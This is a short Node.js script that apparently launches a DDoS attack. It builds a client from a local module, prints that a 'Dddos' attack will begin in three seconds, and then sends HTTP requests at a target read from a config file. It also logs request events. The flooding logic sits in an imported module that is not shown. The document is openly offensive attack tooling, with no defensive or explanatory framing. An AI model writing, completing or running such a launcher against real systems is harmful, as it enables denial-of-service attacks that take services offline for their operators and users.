const { Client } = require("./module/index")
const config = require("./config")
const client = new Client({ autoScrapeConfig: { enabled: true, file: "../config.js" } })
client.build()
    .catch(error => {
        console.error("Client can't enter ready " + error + "")
    })
    .then(c => {
        console.log("Dddos client is now ready. Launching attack in 3 seconds.")
        setTimeout(() => {
            client.createHttpRequest(config.target)
        }, 3000);
    })

client.on("requestDebug", msg => {
    console.log(msg)
})
client.on("WebRequestClosed", (id, reason) => {
    console.log(`Web request with id ${id} closed with reason ${reason}`)
})